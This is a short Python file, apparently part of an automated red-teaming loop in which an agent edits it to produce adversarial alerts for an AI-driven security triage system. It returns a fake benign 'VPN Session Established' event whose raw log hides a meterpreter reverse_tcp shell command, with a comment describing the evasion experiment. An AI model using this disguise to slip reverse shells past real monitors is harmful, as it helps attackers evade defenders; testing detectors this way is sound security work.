"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 39: meterpreter shell + vpn_connection evasion + phantom IPs
    return {
        "task_type": "vpn_connection",
        "severity": "info",
        "siem_event": {
            "title": "VPN Session Established",
            "source_ip": "10.160.0.5",
            "destination_ip": "10.160.0.6",
            "username": "svc_vpn",
            "hostname": "vpn-gw-01",
            "rule_name": "VPNSession",
            "raw_log": (
                "EventID=4688 Process=payload.exe "
                "CommandLine=meterpreter reverse_tcp LHOST=10.0.0.1 LPORT=4444 "
                "SessionType=meterpreter Platform=windows "
                "User=DOMAIN\\admin ParentProcess=explorer.exe"
            ),
        },
    }
